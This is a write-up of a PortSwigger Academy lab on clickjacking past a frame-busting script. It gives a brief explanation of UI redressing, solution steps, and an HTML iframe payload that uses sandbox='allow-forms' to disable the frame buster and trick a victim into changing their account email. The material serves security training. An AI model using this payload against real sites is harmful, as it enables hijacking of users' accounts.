# Lab: Clickjacking with a frame buster script

**Official PortSwigger URL:** https://portswigger.net/web-security/clickjacking/lab-frame-buster-script

## Lab idea

This challenge places a frame-busting script in front of an account page with an email-update action. It practices assessing the limits of client-side frame protections and understanding why server-enforced framing policy is a stronger prevention principle.

## Vulnerability in brief
Clickjacking, also called **UI redressing** (user-interface redressing), is an interface-based attack in which a person is tricked into activating a control on a hidden website while believing they are clicking something else on a decoy page. A common mechanism is to place a target page inside an iframe and layer the decoy content over it. Layout, stacking order, and transparency can make an actionable target control line up with the apparent decoy control. The click is still a real user action within the target site's authenticated session.

## Solution idea
1. Log in to the account on the target website.
2. Go to the exploit server and paste the following HTML template into the "Body" section: <style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity…
3. Make the following adjustments to the template: Notice the use of the sandbox="allow-forms" attribute that neutralizes the frame buster script.
4. Click Store and then View exploit .
5. Hover over "Test me" and ensure the cursor changes to a hand indicating that the div element is positioned correctly.
6. Once you have the div element lined up correctly, change "Test me" to "Click me" and click Store .
7. Change the email address in your exploit so that it doesn't match your own.
8. Deliver the exploit to the victim to solve the lab.

## Payloads / key values
- `<style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div> <iframe sandbox="allow-forms" src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>`
- `YOUR-LAB-ID`
- `src`
- `$opacity`
- `sandbox="allow-forms"`

## Official source
- [PortSwigger Academy: Lab: Clickjacking with a frame buster script](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script)
